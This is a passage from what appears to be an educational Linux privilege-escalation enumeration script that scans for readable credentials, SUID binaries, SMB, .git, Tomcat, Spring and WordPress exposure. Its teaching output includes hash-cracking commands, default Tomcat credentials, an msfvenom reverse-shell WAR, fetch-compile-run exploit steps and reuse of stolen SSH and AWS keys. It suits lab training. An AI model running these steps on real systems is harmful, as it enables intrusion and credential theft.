            echo -ne "\r[INFO] Searching $location... ($current_creds/$total_creds) - Press ENTER to skip" >&2
            
            [ ! -d "$location" ] && continue
            
            for pattern in "${cred_patterns[@]}"; do
                find "$location" -maxdepth 5 -name "$pattern" -type f -readable 2>/dev/null | head -20 | while read cred_file; do
                    # Additional quality filter - must actually contain credential-like content
                    if file "$cred_file" 2>/dev/null | grep -qE "text|ASCII|PEM"; then
                        if grep -qE "PRIVATE KEY|password|secret|token|BEGIN.*PRIVATE" "$cred_file" 2>/dev/null; then
                            echo "$cred_file" >> "$temp_cred_files"
                        fi
                    elif echo "$cred_file" | grep -qE "\.key$|\.pem$|\.ppk$"; then
                        # Key files by extension (even if binary)
                        echo "$cred_file" >> "$temp_cred_files"
                    fi
                done
            done
        done
        echo -ne "\r\033[K" >&2
    fi
    
    # === CHECK 4: Readable sensitive config files ===
    if ! $skip_suid && ! ${skip_recent:-false} && ! ${skip_creds:-false}; then
        info "Checking readable sensitive configuration files..."
        
        # Specific high-value configs (not every .conf file)
        local sensitive_configs=(
            "/etc/shadow"
            "/etc/sudoers"
            "/etc/ssh/sshd_config"
            "/etc/mysql/my.cnf"
            "/etc/postgresql/*/main/pg_hba.conf"
            "/etc/openvpn/*.conf"
            "/root/.ssh/config"
            "/root/.aws/credentials"
            "/root/.docker/config.json"
        )
        
        for config_pattern in "${sensitive_configs[@]}"; do
            for config in $config_pattern; do
                [ ! -e "$config" ] && continue
                if [ -r "$config" ]; then
                    echo "$config" >> "$temp_config_readable"
                fi
            done
        done
    fi
    
    # Clear any remaining input
    read -t 0.01 -n 10000 discard 2>/dev/null || true
    
    # PHASE 2: CONDITIONAL EDUCATION (only if high-value findings)
    local found_issues=0
    [ -s "$temp_suid_unusual" ] && found_issues=$((found_issues + 1))
    [ -s "$temp_recent_sensitive" ] && found_issues=$((found_issues + 1))
    [ -s "$temp_cred_files" ] && found_issues=$((found_issues + 1))
    [ -s "$temp_config_readable" ] && found_issues=$((found_issues + 1))
    
    if [ $found_issues -gt 0 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  INTERESTING FILES - Why These Matter"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "FILE DISCOVERY CATEGORIES:"
        teach ""
        teach "1. UNUSUAL SUID/SGID BINARIES:"
        teach "   SUID binaries in /tmp, /home, or /opt are suspicious."
        teach "   Legitimate SUID binaries stay in /usr/bin or /bin."
        teach "   Custom SUID binaries often have vulnerabilities."
        teach ""
        teach "2. RECENTLY MODIFIED CONFIGS:"
        teach "   Files modified in last 48 hours in /etc or /root indicate:"
        teach "   • Active system changes (admin is working)"
        teach "   • Temporary misconfigurations during updates"
        teach "   • Testing environments with weak security"
        teach "   Recent changes = less hardened, more mistakes"
        teach ""
        teach "3. CREDENTIAL FILES:"
        teach "   SSH keys, API tokens, password files left readable"
        teach "   Often forgotten during development/testing"
        teach "   Enable lateral movement or service access"
        teach ""
        teach "4. READABLE SENSITIVE CONFIGS:"
        teach "   Files that should only be readable by root"
        teach "   Contain passwords, security settings, keys"
        teach "   Indicate permission misconfigurations"
        log ""
    fi
    
    # PHASE 3: REPORT SPECIFIC FINDINGS
    
    # Report unusual SUID binaries
    if [ -s "$temp_suid_unusual" ]; then
        critical "${WORK}[REQUIRES INVESTIGATION]${RST}UNUSUAL SUID/SGID BINARIES - Custom binaries with root privileges"
        log ""
        
        while IFS= read -r suid_file; do
            local perms=$(stat -c %a "$suid_file" 2>/dev/null)
            local owner=$(stat -c %U "$suid_file" 2>/dev/null)
            
            vuln "SUID/SGID binary: $suid_file"
            info "  Owner: $owner | Permissions: $perms"
            log ""
        done < "$temp_suid_unusual"
        
        teach "ANALYSIS STEPS FOR UNUSUAL SUID BINARIES:"
        teach ""
        teach "  1. Identify binary type:"
        teach "     file /path/to/suid_binary"
        teach ""
        teach "  2. Check for readable strings:"
        teach "     strings /path/to/suid_binary | grep -E 'system|exec|popen|/bin/'"
        teach ""
        teach "  3. Trace library calls:"
        teach "     ltrace /path/to/suid_binary 2>&1 | grep -E 'system|exec'"
        teach ""
        teach "  4. Look for command execution without absolute paths:"
        teach "     strings /path/to/suid_binary | grep -vE '^/' | grep '^[a-z]'"
        teach "     # These can be PATH hijacked"
        teach ""
        teach "  5. Check GTFOBins:"
        teach "     https://gtfobins.github.io/#$(basename $(head -1 $temp_suid_unusual))"
        teach ""
        teach "COMMON VULNERABILITIES:"
        teach "  • Calls system(\"command\") without full path → PATH hijacking"
        teach "  • Buffer overflow in user input handling"
        teach "  • Race conditions (TOCTOU)"
        teach "  • Unsafe environment variable usage"
        teach "  • Command injection via arguments"
        log ""
    fi
    
    # Report recently modified sensitive files
    if [ -s "$temp_recent_sensitive" ]; then
        warn "Recently modified files in sensitive locations (last 48 hours)"
        log ""
        
        local count=0
        while IFS= read -r recent_file; do
            count=$((count + 1))
            [ $count -gt 15 ] && break  # Limit output
            
            local mod_time=$(stat -c %y "$recent_file" 2>/dev/null | cut -d. -f1)
            info "  $recent_file"
            log "    Modified: $mod_time"
        done < "$temp_recent_sensitive"
        
        local total=$(wc -l < "$temp_recent_sensitive")
        if [ $total -gt 15 ]; then
            info "  ... and $((total - 15)) more files"
        fi
        
        log ""
        teach "WHY RECENT MODIFICATIONS MATTER:"
        teach "  • Admin actively making changes = higher chance of mistakes"
        teach "  • Temporary test configurations left in place"
        teach "  • New services not yet hardened"
        teach "  • Modified config files may have backup versions (.bak, ~)"
        teach ""
        teach "WHAT TO CHECK:"
        teach "  1. Review modified configs for new vulnerabilities"
        teach "  2. Look for backup files: ls -la /etc/*.bak /etc/*~"
        teach "  3. Check if modifications introduced writable permissions"
        teach "  4. Recent cron jobs: cat /etc/crontab"
        log ""
    fi
    
    # Report credential files
    if [ -s "$temp_cred_files" ]; then
        warn "CREDENTIAL FILES READABLE - SSH keys, secrets, password files"
        log ""
        
        while IFS= read -r cred_file; do
            vuln "Credential file: $cred_file"
            
            # Determine file type and give specific guidance
            case "$cred_file" in
                *.pem|*.key|*id_rsa*|*id_ed25519*|*id_ecdsa*)
                    critical "  SSH/SSL private key detected"
                    teach "  Usage: ssh -i $cred_file user@target"
                    teach "  Check key permissions: chmod 600 $cred_file"
                    ;;
                *.ppk)
                    warn "  PuTTY private key (Windows format)"
                    teach "  Convert to OpenSSH: puttygen $cred_file -O private-openssh -o id_rsa"
                    ;;
                .htpasswd)
                    warn "  Apache htpasswd file - contains password hashes"
                    teach "  Crack with: john $cred_file"
                    ;;
                *.pgpass|.my.cnf)
                    critical " ${WORK}[INTERESTING]${RST} Database credential file"
                    teach "  Contains plaintext database passwords"
                    ;;
                .netrc)
                    warn "  .netrc file - auto-login credentials"
                    teach "  Contains FTP/HTTP credentials in plaintext"
                    ;;
                *secret*|*credential*)
                    warn "  Generic credential file - inspect contents"
                    teach "  cat $cred_file | head -20"
                    ;;
            esac
            log ""
        done < "$temp_cred_files"
        
        teach "CREDENTIAL FILE EXPLOITATION:"
        teach ""
        teach "  SSH KEYS:"
        teach "    1. Copy to attacker machine"
        teach "    2. Set permissions: chmod 600 key"
        teach "    3. Identify target user (check .ssh/config or authorized_keys)"
        teach "    4. ssh -i key user@target"
        teach ""
        teach "  API KEYS/TOKENS:"
        teach "    1. Identify service (AWS, GitHub, etc.)"
        teach "    2. Use appropriate CLI tool:"
        teach "       aws configure set aws_access_key_id KEY"
        teach "       export GITHUB_TOKEN=token"
        teach "    3. Test access and enumerate permissions"
        teach ""
        teach "  PASSWORD FILES:"
        teach "    1. Extract hashes: cat file | grep '$'"
        teach "    2. Identify hash type: hash-identifier"
        teach "    3. Crack: john --wordlist=rockyou.txt hashes.txt"
        log ""
    fi
    
    # Report readable sensitive configs
    if [ -s "$temp_config_readable" ]; then
        critical "SENSITIVE CONFIGS READABLE - Should be root-only"
        log ""
        
        while IFS= read -r config; do
            vuln "Readable config: $config"
            
            case "$config" in
                */shadow)
                    critical "${WORK}[REQUIRES CRACKING]${RST}  /etc/shadow is READABLE - password hashes exposed!"
                    teach "  Extract hashes: grep -v '^[^:]*:[*!]:' /etc/shadow"
                    teach "  Crack with john: john --wordlist=rockyou.txt shadow"
                    ;;
                */sudoers)
                    critical "${WORK}[REQUIRES INVESTIGATION]${RST}  /etc/sudoers is READABLE - sudo rules exposed"
                    teach "  Review for NOPASSWD entries and misconfigurations"
                    ;;
                *sshd_config)
                    warn "  SSH server config readable"
                    teach "  Check for: PermitRootLogin yes, PasswordAuthentication yes"
                    ;;
                *my.cnf|*pg_hba.conf)
                    warn "  Database config readable - may contain credentials"
                    teach "  grep -E 'password|user' $config"
                    ;;
                *.aws/credentials)
                    warn "  AWS credentials readable - cloud access!"
                    teach "  Use with: aws configure --profile default"
                    ;;
                *.docker/config.json)
                    warn "  Docker config readable - registry credentials"
                    teach "  cat $config | jq -r '.auths[].auth' | base64 -d"
                    ;;
            esac
            log ""
        done < "$temp_config_readable"
        
        log ""
    fi
    
    # PHASE 4: CLEAN SUMMARY
    if [ $found_issues -eq 0 ]; then
        ok "No high-value interesting files found in scanned locations"
        log ""
        teach "Scanned for:"
        teach "  • Unusual SUID/SGID binaries"
        teach "  • Recently modified sensitive files"
        teach "  • Readable credential files (keys, secrets)"
        teach "  • Readable sensitive configurations"
    else
        log ""
        info "File discovery complete - $found_issues categories with findings"
    fi
}
# ============================================
# Enhanced Hidden File Search
# ============================================

enum_hidden_files() {
    section "HIDDEN FILES & DIRECTORIES"
    
    explain_concept "Hidden Files" \
        "Files/directories starting with '.' are hidden from normal 'ls' commands. Attackers use these to hide tools, backdoors, and persistence mechanisms." \
        "Unix convention: files starting with '.' don't appear in directory listings unless using 'ls -a'. This is a feature, not security, but attackers exploit it to hide malicious files in plain sight." \
        "Focus on:\n  • /tmp, /var/tmp, /dev/shm (temporary storage)\n  • User home directories\n  • Unusual locations like /, /opt, /usr"
    
    info "Searching for hidden files in sensitive locations..."
    
    # Check common hiding spots
    for dir in /tmp /var/tmp /dev/shm /opt /; do
        if [ -d "$dir" ]; then
            find "$dir" -maxdepth 2 -name ".*" -type f 2>/dev/null | while read hidden; do
                case "$(basename "$hidden")" in
                    .bash_history|.bashrc|.profile|.vimrc|.ssh|.cache|.local|.config|.gnupg)
                        # Normal hidden files, skip
                        ;;
                    *)
                        warn "Hidden file: $hidden"
                        
                        # Check if executable
                        if [ -x "$hidden" ]; then
                            vuln "Hidden EXECUTABLE: $hidden"
                        fi
                        
                        # Check if SUID
                        if [ -u "$hidden" ]; then
                            critical "Hidden SUID binary: $hidden"
                        fi
                        ;;
                esac
            done
            
            # Check for hidden directories
            find "$dir" -maxdepth 2 -name ".*" -type d 2>/dev/null | while read hidden_dir; do
                case "$(basename "$hidden_dir")" in
                    .ssh|.gnupg|.cache|.local|.config)
                        # Normal, skip
                        ;;
                    *)
                        warn "Hidden directory: $hidden_dir"
                        ;;
                esac
            done
        fi
    done
}

# ═══════════════════════════════════════════════════════════════
# ADDITIONAL ENUMERATION MODULES
# ═══════════════════════════════════════════════════════════════

# === SMB/SAMBA ENUMERATION ===
enum_smb() {
    section "SMB/SAMBA SHARE ENUMERATION"
    
    explain_concept "SMB/Samba Shares" \
        "SMB (Server Message Block) shares allow file sharing over a network. Misconfigurations can expose sensitive files or allow unauthorized access." \
        "Many systems allow 'null sessions' (no authentication) or have shares with weak permissions. Windows and Linux both use SMB/Samba for file sharing. HTB boxes frequently have readable or writable shares containing flags or credentials." \
        "Exploitation:\n  1. Check for null session: smbclient -N -L //TARGET\n  2. List shares: smbmap -H TARGET\n  3. Access share: smbclient //TARGET/share -N\n  4. Look for writable shares for payload delivery"
    
    # Check if SMB service is actually running
    local smb_running=0
    if systemctl is-active --quiet smbd 2>/dev/null || systemctl is-active --quiet nmbd 2>/dev/null; then
        smb_running=1
        warn "SMB service is ACTIVE"
    fi
    
    # Check if SMB tools are available
    if ! command -v smbclient >/dev/null 2>&1; then
        warn "smbclient not installed - cannot enumerate SMB shares"
        teach "Install with: apt install smbclient"
        return
    fi
    
    # Only check for network enumeration if service is running
    if [ $smb_running -eq 1 ]; then
        # Check for SMB ports
        if netstat -tuln 2>/dev/null | grep -qE ":445 |:139 "; then
            info "SMB ports detected (445 or 139)"
            
            # Try localhost enumeration
            info "Attempting null session enumeration on localhost..."
            local smb_shares=$(smbclient -N -L //127.0.0.1 2>/dev/null | grep "Disk" | awk '{print $1}')
            
            if [ -n "$smb_shares" ]; then
                warn "${WORK}[INTERESTING]${RST} SMB shares accessible with null session"
                echo "$smb_shares" | while read share; do
                    log "  Share: $share"
                    
                    # Try to access the share
                    if smbclient -N "//127.0.0.1/$share" -c "ls" 2>/dev/null | grep -q "."; then
                        warn "${WORK}[INTERESTING]${RST} Share $share is READABLE without authentication"
                        teach "Access with: smbclient -N //127.0.0.1/$share"
                    fi
                done
            else
                ok "No null session access to SMB shares"
            fi
        else
            ok "SMB ports not listening"
        fi
    fi
    
    # Check for Samba config (regardless of service status)
    if [ -r /etc/samba/smb.conf ]; then
        if [ $smb_running -eq 1 ]; then
            info "Checking Samba configuration (service is running)..."
        else
            info "Samba configuration found but service is not running"
        fi
        
        # Only flag as vulnerability if service is actually running
        if [ $smb_running -eq 1 ]; then
            # Check for writable shares
            if sed 's/[;#].*//' /etc/samba/smb.conf | grep -v '^[[:space:]]*$' | grep -A 5 "\[.*\]" | grep -q "writable = yes\|read only = no"; then
                vuln "Writable SMB shares configured in active service"
                sed 's/[;#].*//' /etc/samba/smb.conf | grep -A 5 "writable = yes\|read only = no" | head -10
                teach "Check share permissions and accessible paths"
            fi
            
            # Check for guest access
            if sed 's/[;#].*//' /etc/samba/smb.conf | grep -v '^[[:space:]]*$' | grep -qi "guest.*ok.*yes\|map.*to.*guest\|usershare.*allow.*guests.*yes"; then
                vuln "Guest access configured in active Samba service"
                warn "SMB shares allow guest access or map failed logins to guest"
                teach "Guest can access shares without authentication"
            fi
        else
            ok "Samba configured but service is inactive - no active vulnerability"
        fi
    fi
}
# === EXPOSED .GIT DIRECTORY ===
enum_git_exposure() {
    section "EXPOSED .GIT DIRECTORY ENUMERATION"
    
    explain_concept "Exposed .git Directories" \
        "Web applications sometimes deploy with their .git directory accessible, exposing the entire source code repository including commit history." \
        "Developers deploy code using 'git clone' or 'git pull' in the web root, forgetting that .git/ contains the complete repository. This includes all commits, deleted files, configuration with credentials, and development history. HTB boxes love this misconfiguration." \
        "Exploitation:\n  1. Check: curl http://target/.git/config\n  2. Dump repo: git-dumper http://target/.git /output/dir\n  3. Review history: git log --all\n  4. Search for secrets: git log -p | grep -i password"
    
    # Check common web roots for .git
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
    
    for webroot in "${web_roots[@]}"; do
        if [ -d "$webroot/.git" ]; then
            critical "EXPOSED .git directory: $webroot/.git"
            vuln "Git repository in web root: $webroot/.git"
            
            if [ -r "$webroot/.git/config" ]; then
                critical "Git config readable - may contain credentials"
                info "Git config location: $webroot/.git/config"
                
                # Check for remote URLs with credentials
                if grep -E "https://.*:.*@" "$webroot/.git/config" 2>/dev/null | grep -q "."; then
                    critical "Git remote URL contains embedded credentials"
                    grep -E "url = " "$webroot/.git/config" 2>/dev/null
                fi
            fi
            
            # Check git logs for interesting commits
            if [ -d "$webroot/.git" ]; then
                cd "$webroot" 2>/dev/null && {
                    info "Checking git commit history..."
                    local commit_count=$(git log --all 2>/dev/null | grep "^commit" | wc -l)
                    if [ $commit_count -gt 0 ]; then
                        warn "Repository has $commit_count commits - review history for secrets"
                        teach "Commands to review:"
                        teach "  cd $webroot"
                        teach "  git log --all"
                        teach "  git log -p | grep -i 'password\\|secret\\|key'"
                        teach "  git show [commit-hash]"
                    fi
                }
            fi
            
            teach "If accessible via web:"
            teach "  1. Use git-dumper to clone: git-dumper http://target/.git /output"
            teach "  2. Review all branches: git branch -a"
            teach "  3. Check deleted files: git log --diff-filter=D --summary"
        fi
    done
    
    # Check if in a git repo currently
    if [ -d ".git" ] && [ -r ".git/config" ]; then
        warn "Current directory is a git repository"
        info "Git config: ./.git/config"
        
        if git log -p 2>/dev/null | grep -iE "password|secret|key|token" | head -3 | grep -q "."; then
            vuln "Git history contains potential secrets"
            teach "Review with: git log -p | grep -i password"
        fi
    fi
}

# === TOMCAT MANAGER ENUMERATION ===
enum_tomcat() {
    section "APACHE TOMCAT ENUMERATION"
    
    explain_concept "Tomcat Manager Application" \
        "Apache Tomcat's manager application allows deploying WAR files. Default credentials or weak passwords give instant code execution." \
        "Tomcat manager (/manager/html) is used to deploy web applications. If accessible with default or weak credentials, you can upload a malicious WAR file containing a web shell. This is essentially RCE with one upload. HTB loves Tomcat boxes." \
        "Exploitation:\n  1. Access /manager/html\n  2. Try default creds: tomcat:tomcat, admin:admin, tomcat:s3cret\n  3. Generate WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war\n  4. Upload via manager interface\n  5. Trigger: curl http://target:8080/shell/"
    
    # Check for Tomcat ports
    if netstat -tuln 2>/dev/null | grep -qE ":8080 |:8009 "; then
        warn "Tomcat ports detected (8080 or 8009)"
        
        # Check for Tomcat installation
        local tomcat_dirs=("/opt/tomcat" "/usr/share/tomcat" "/var/lib/tomcat" "/opt/apache-tomcat")
        
        for tomcat_dir in "${tomcat_dirs[@]}"; do
            if [ -d "$tomcat_dir" ]; then
                info "Tomcat installation found: $tomcat_dir"
                
                # Check tomcat-users.xml
                if [ -r "$tomcat_dir/conf/tomcat-users.xml" ]; then
                    critical "tomcat-users.xml is READABLE: $tomcat_dir/conf/tomcat-users.xml"
                    
                    if grep -E "role.*manager" "$tomcat_dir/conf/tomcat-users.xml" 2>/dev/null | grep -q "."; then
                        critical "Manager role configured with credentials"
                        vuln "Tomcat manager credentials exposed in tomcat-users.xml"
                        grep -E "role.*manager|user.*password" "$tomcat_dir/conf/tomcat-users.xml" 2>/dev/null | head -5
                        
                        teach "Extract credentials and access manager at:"
                        teach "  http://localhost:8080/manager/html"
                    fi
                fi
                
                # Check for manager application
                if [ -d "$tomcat_dir/webapps/manager" ]; then
                    warn "Tomcat manager application is deployed"
                    teach "Common default credentials to try:"
                    teach "  tomcat:tomcat"
                    teach "  admin:admin"
                    teach "  tomcat:s3cret"
                    teach "  admin:password"
                fi
            fi
        done
    else
        ok "Tomcat ports not detected"
    fi
}

# === SPRING BOOT ACTUATOR ===
enum_spring_actuator() {
    section "SPRING BOOT ACTUATOR ENUMERATION"
    
    explain_concept "Spring Boot Actuators" \
        "Spring Boot applications expose 'actuator' endpoints for monitoring and management. Misconfigured actuators leak sensitive information or allow RCE." \
        "Spring Boot's actuator endpoints provide app metrics, health info, and environment variables. If exposed without authentication, they leak database passwords, API keys, and app config. Some endpoints like /jolokia or /env can lead to RCE." \
        "Common endpoints:\n  /actuator - Lists available endpoints\n  /actuator/env - Environment variables (passwords!)\n  /actuator/health - App health (sometimes shows DB status)\n  /actuator/mappings - All routes\n  /actuator/heapdump - Memory dump (credentials in memory)"
    
    # Check for Java processes
    if ps aux | grep -iE "java.*spring|spring.*boot" | grep -v grep | grep -q "."; then
        warn "Spring Boot application detected in running processes"
        
        info "Checking common Spring Boot actuator endpoints..."
        
        # Check for listening ports that might be Spring Boot
        if netstat -tuln 2>/dev/null | grep -qE ":8080 |:8081 |:8443 "; then
            info "Potential Spring Boot ports detected"
            
            teach "If you have web access, check these endpoints:"
            teach "  curl http://target:8080/actuator"
            teach "  curl http://target:8080/actuator/env"
            teach "  curl http://target:8080/actuator/heapdump"
            teach "  curl http://target:8080/actuator/mappings"
            teach "  curl http://target:8080/env (older Spring Boot)"
        fi
    fi
    
    # Check web roots for Spring Boot applications
    local web_roots=("/var/www" "/opt" "/usr/local")
    
    for webroot in "${web_roots[@]}"; do
        find "$webroot" -name "*.jar" 2>/dev/null | head -10 | while read jar; do
            if unzip -l "$jar" 2>/dev/null | grep -q "spring-boot"; then
                warn "Spring Boot JAR found: $jar"
                
                # Check for application.properties or application.yml
                local app_dir=$(dirname "$jar")
                if [ -r "$app_dir/application.properties" ]; then
                    vuln "Spring Boot config readable: $app_dir/application.properties"
                    
                    if grep -iE "password|secret|key" "$app_dir/application.properties" 2>/dev/null | head -3 | grep -q "."; then
                        critical "Spring Boot config contains credentials"
                        grep -iE "password|secret|key" "$app_dir/application.properties" 2>/dev/null | head -3
                    fi
                fi
                
                if [ -r "$app_dir/application.yml" ]; then
                    vuln "Spring Boot config readable: $app_dir/application.yml"
                    
                    if grep -iE "password|secret|key" "$app_dir/application.yml" 2>/dev/null | head -3 | grep -q "."; then
                        critical "Spring Boot YAML config contains credentials"
                        grep -iE "password|secret|key" "$app_dir/application.yml" 2>/dev/null | head -3
                    fi
                fi
            fi
        done
    done
}

# === WORDPRESS EXTENDED ===
enum_wordpress_extended() {
    section "WORDPRESS EXTENDED ENUMERATION"
    
    explain_concept "WordPress Vulnerabilities" \
        "WordPress sites have many attack surfaces: plugins, themes, xmlrpc.php, user enumeration via JSON API, and configuration backups." \
        "WordPress is extremely common and frequently misconfigured. Plugin/theme vulnerabilities are constantly discovered. The xmlrpc.php file allows authentication brute forcing with amplification. The wp-json API leaks usernames. Config backups expose database credentials." \
        "Attack vectors:\n  • Plugin/theme vulnerabilities (check version against exploit-db)\n  • User enumeration: curl http://site/wp-json/wp/v2/users\n  • xmlrpc.php brute force amplification\n  • wp-config.php backups (.bak, .old, ~, .save)\n  • Unprotected wp-admin/install.php"
    
    # Check for WordPress installations
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
    
    for webroot in "${web_roots[@]}"; do
        if [ -f "$webroot/wp-config.php" ]; then
            info "WordPress installation found: $webroot"
            
            # Check for wp-config.php
            if [ -r "$webroot/wp-config.php" ]; then
                critical "wp-config.php is READABLE - contains database credentials"
                vuln "WordPress config readable: $webroot/wp-config.php"
                
                # Extract DB credentials
                if grep -E "DB_PASSWORD|DB_USER|DB_NAME" "$webroot/wp-config.php" 2>/dev/null | grep -q "."; then
                    critical "Database credentials in wp-config.php"
                    grep -E "DB_PASSWORD|DB_USER|DB_NAME|DB_HOST" "$webroot/wp-config.php" 2>/dev/null | grep -v "put your"
                fi
                
                # Check for authentication keys
                if grep -E "AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY" "$webroot/wp-config.php" 2>/dev/null | grep -q "put your unique phrase here"; then
                    warn "WordPress using default authentication keys"
                    teach "Default keys = weaker session security"
                fi
            fi
            
            # Check for wp-config backups
            find "$webroot" -name "wp-config.php*" -o -name "*wp-config*" 2>/dev/null | grep -vE "wp-config.php$" | while read backup; do
                if [ -r "$backup" ]; then
                    critical "wp-config backup found: $backup"
                    vuln "WordPress config backup: $backup"
                fi
            done
            
            # Check xmlrpc.php
            if [ -f "$webroot/xmlrpc.php" ]; then
                warn "xmlrpc.php present - enables brute force amplification"
                teach "Test if enabled: curl -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://target/xmlrpc.php"
                teach "If enabled, can amplify brute force attacks significantly"
            fi
            
            # Check for wp-json API
            if [ -d "$webroot/wp-json" ] || [ -d "$webroot/wp-includes/rest-api" ]; then
                info "WordPress REST API present"
                teach "Enumerate users: curl http://target/wp-json/wp/v2/users"
                teach "Leaked usernames can be used for brute forcing"
            fi
            
            # Check plugins
            if [ -d "$webroot/wp-content/plugins" ]; then
                info "Checking installed plugins..."
                local plugin_count=$(ls -1 "$webroot/wp-content/plugins" 2>/dev/null | wc -l)
                warn "Found $plugin_count installed plugins"
                
                # List plugins
                ls -1 "$webroot/wp-content/plugins" 2>/dev/null | head -10 | while read plugin; do
                    log "  Plugin: $plugin"
                    
                    # Check for readme files that reveal version
                    if [ -f "$webroot/wp-content/plugins/$plugin/readme.txt" ]; then
                        local version=$(grep -i "stable tag" "$webroot/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | head -1)
                        if [ -n "$version" ]; then
                            info "  Version: $version"
                            teach "  Check exploit-db for: $plugin $version"
                        fi
                    fi
                done
                
                teach "\nPlugin enumeration:"
                teach "  Search exploit-db: searchsploit wordpress [plugin-name]"
                teach "  Or use: wpscan --url http://target --enumerate p"
            fi
        fi
    done
}


# === TOOLS AVAILABILITY ===
enum_tools() {
    section "INSTALLED TOOLS & COMPILERS"
    
    # PHASE 1: SILENT SCAN - Categorize available tools by exploitation value
    local temp_compilers="/tmp/.learnpeas_compilers_$$"
    local temp_exploit_langs="/tmp/.learnpeas_exploit_langs_$$"
    local temp_pivot_tools="/tmp/.learnpeas_pivot_tools_$$"
    local temp_container_tools="/tmp/.learnpeas_container_tools_$$"
    local temp_download_tools="/tmp/.learnpeas_download_tools_$$"
    
    cleanup_tool_temps() {
        rm -f "$temp_compilers" "$temp_exploit_langs" "$temp_pivot_tools" \
              "$temp_container_tools" "$temp_download_tools" 2>/dev/null
    }
    trap cleanup_tool_temps RETURN
    
    # Compilers - needed to build kernel exploits, C exploits
    local compilers=("gcc" "g++" "cc" "clang" "make")
    
    # Scripting languages - needed for exploit scripts and pty shells
    local exploit_langs=("python" "python2" "python3" "perl" "ruby" "php" "node" "nodejs")
    
    # Download tools - needed to fetch exploits from exploit-db/GitHub
    local download_tools=("wget" "curl" "fetch" "nc" "ncat" "socat")
    
    # Network/pivot tools - needed for lateral movement and pivoting
    local pivot_tools=("nmap" "netcat" "nc" "ncat" "socat" "ssh" "sshpass" "proxychains" "chisel")
    
    # Container/orchestration - indicates container environment or orchestration access
    local container_tools=("docker" "kubectl" "podman" "lxc" "lxd")
    
    # Scan for compilers
    for tool in "${compilers[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            local version=$(command -v "$tool" 2>/dev/null)
            echo "$tool|$version" >> "$temp_compilers"
        fi
    done
    
    # Scan for exploit languages
    for tool in "${exploit_langs[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            local version=$("$tool" --version 2>/dev/null | head -1 || echo "version unknown")
            echo "$tool|$version" >> "$temp_exploit_langs"
        fi
    done
    
    # Scan for download tools
    for tool in "${download_tools[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            echo "$tool" >> "$temp_download_tools"
        fi
    done
    
    # Scan for pivot tools
    for tool in "${pivot_tools[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            echo "$tool" >> "$temp_pivot_tools"
        fi
    done
    
    # Scan for container tools (HIGH PRIORITY - check group membership)
    for tool in "${container_tools[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            echo "$tool" >> "$temp_container_tools"
        fi
    done
    
    # PHASE 2: CONDITIONAL EDUCATION - Only if exploitation-critical tools found
    local has_compilers=$([ -s "$temp_compilers" ] && echo 1 || echo 0)
    local has_exploit_langs=$([ -s "$temp_exploit_langs" ] && echo 1 || echo 0)
    local has_download=$([ -s "$temp_download_tools" ] && echo 1 || echo 0)
    local has_pivot=$([ -s "$temp_pivot_tools" ] && echo 1 || echo 0)
    local has_containers=$([ -s "$temp_container_tools" ] && echo 1 || echo 0)
    
    # Only show education if we found exploitation-enabling tools
    if [ $has_compilers -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  COMPILERS - Building Kernel & Binary Exploits"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "WHY COMPILERS MATTER:"
        teach "  Kernel exploits (DirtyCOW, Dirty Pipe, PwnKit) are distributed as C source."
        teach "  Without gcc/clang, you cannot compile these exploits locally."
        teach ""
        teach "AVAILABLE COMPILERS:"
        while IFS='|' read -r compiler path; do
            info "  ✓ $compiler → $path"
        done < "$temp_compilers"
        teach ""
        teach "EXPLOITATION WORKFLOW:"
        teach "  1. Download exploit source:"
        teach "     wget https://example.com/exploit.c"
        teach "  2. Compile locally:"
        teach "     gcc exploit.c -o exploit"
        teach "     # Some exploits need specific flags (read the comments)"
        teach "  3. Execute:"
        teach "     ./exploit"
        teach ""
        teach "IF NO KERNEL HEADERS:"
        teach "  Some kernel exploits need headers. If compilation fails:"
        teach "  • Install headers: apt install linux-headers-\$(uname -r)"
        teach "  • OR compile on matching system and transfer binary"
        teach "  • OR use pre-compiled exploit (search exploit-db)"
        teach ""
        teach "COMMON COMPILE FLAGS:"
        teach "  gcc -pthread exploit.c -o exploit          # Threading support"
        teach "  gcc -static exploit.c -o exploit           # Static binary (portable)"
        teach "  gcc -m32 exploit.c -o exploit              # 32-bit binary"
        teach "  gcc -shared -fPIC evil.c -o evil.so        # Shared library (LD_PRELOAD)"
        log ""
    fi
    
    if [ $has_exploit_langs -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  SCRIPTING LANGUAGES - Exploit Scripts & Shell Upgrades"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "WHY SCRIPTING LANGUAGES MATTER:"
        teach "  1. Many exploits are distributed as Python/Perl/Ruby scripts"
        teach "  2. Needed for upgrading basic shells to full TTY"
        teach "  3. Enable interactive shells with tab completion, job control"
        teach ""
        teach "AVAILABLE INTERPRETERS:"
        while IFS='|' read -r lang version; do
            info "  ✓ $lang → $version"
        done < "$temp_exploit_langs"
        teach ""
        teach "SHELL UPGRADE TECHNIQUES:"
        teach ""
        
        # Python-specific if available
        if grep -q "python" "$temp_exploit_langs"; then
            teach "  PYTHON PTY UPGRADE (Most Common):"
            teach "    python -c 'import pty; pty.spawn(\"/bin/bash\")'"
            teach "    # Or for Python 3:"
            teach "    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
            teach ""
            teach "    FULL INTERACTIVE TTY:"
            teach "    1. python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
            teach "    2. Ctrl+Z (background)"
            teach "    3. stty raw -echo; fg"
            teach "    4. export TERM=xterm-256color"
